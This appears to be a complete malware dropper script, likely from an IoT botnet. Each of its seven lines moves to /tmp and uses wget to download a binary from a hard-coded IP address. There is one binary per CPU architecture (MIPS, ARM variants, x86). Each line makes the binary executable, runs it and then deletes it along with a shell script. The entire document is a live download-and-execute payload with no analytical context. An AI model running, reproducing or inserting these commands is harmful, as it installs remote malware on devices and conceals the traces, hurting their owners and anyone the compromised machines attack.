cd /tmp;wget http://45.95.146.126/splmips; chmod 777 splmips;./splmips vio;rm -rf splmips;rm -rf vio.sh
cd /tmp;wget http://45.95.146.126/splmpsl; chmod 777 splmpsl;./splmpsl vio;rm -rf splmpsl;rm -rf vio.sh
cd /tmp;wget http://45.95.146.126/splarm; chmod 777 splarm;./splarm vio;rm -rf splarm;rm -rf vio.sh
cd /tmp;wget http://45.95.146.126/splarm5; chmod 777 splarm5;./splarm5 vio;rm -rf splarm5;rm -rf vio.sh
cd /tmp;wget http://45.95.146.126/splarm6; chmod 777 splarm6;./splarm6 vio;rm -rf splarm6;rm -rf vio.sh
cd /tmp;wget http://45.95.146.126/splarm7; chmod 777 splarm7;./splarm7 vio;rm -rf splarm7;rm -rf vio.sh
cd /tmp;wget http://45.95.146.126/splx86; chmod 777 splx86;./splx86 vio;rm -rf splx86;rm -rf vio.sh
